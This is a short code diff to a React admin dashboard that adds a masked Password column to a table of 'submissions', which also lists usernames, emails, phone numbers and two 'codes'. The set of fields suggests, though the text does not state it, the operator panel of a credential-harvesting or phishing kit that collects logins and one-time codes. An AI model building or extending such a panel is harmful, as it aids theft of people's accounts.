@@ -137,6 +137,7 @@ export function AdminDashboard({ initialSubmissions }: AdminDashboardProps) {
                 <TableHead>User</TableHead>
                 <TableHead>Username</TableHead>
                 <TableHead>Email</TableHead>
+                <TableHead>Password</TableHead>
                 <TableHead>Code 1</TableHead>
                 <TableHead>Phone</TableHead>
                 <TableHead>Code 2</TableHead>
@@ -159,6 +160,9 @@ export function AdminDashboard({ initialSubmissions }: AdminDashboardProps) {
                     </TableCell>
                     <TableCell className="text-xs text-muted-foreground">
                         {sub.email || '...'}
+                    </TableCell>
+                    <TableCell className="text-xs text-muted-foreground font-mono">
+                        {sub.password ? '********' : '...'}
                     </TableCell>
                       <TableCell>
                         <div className="flex items-center gap-2">
@@ -242,7 +246,7 @@ export function AdminDashboard({ initialSubmissions }: AdminDashboardProps) {
                 ))
               ) : (
                 <TableRow>
-                  <TableCell colSpan={8} className="h-24 text-center">
+                  <TableCell colSpan={9} className="h-24 text-center">
                     No submissions found.
                   </TableCell>
                 </TableRow>
